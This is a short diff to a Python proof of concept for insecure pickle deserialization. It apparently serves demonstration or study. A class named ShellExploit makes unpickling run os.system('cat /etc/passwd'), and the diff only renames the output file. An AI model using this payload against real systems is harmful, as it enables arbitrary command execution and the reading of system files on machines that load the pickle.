@@ -6,7 +6,7 @@ class ShellExploit(object):
         return (os.system, ('cat /etc/passwd', ))
 
 def serialize():
-    with open('./mydata.pickle', 'wb') as storedata: 
+    with open('./pickle.dat', 'wb') as storedata: 
         pickle.dump(ShellExploit(), storedata)
 
 if __name__ == '__main__':
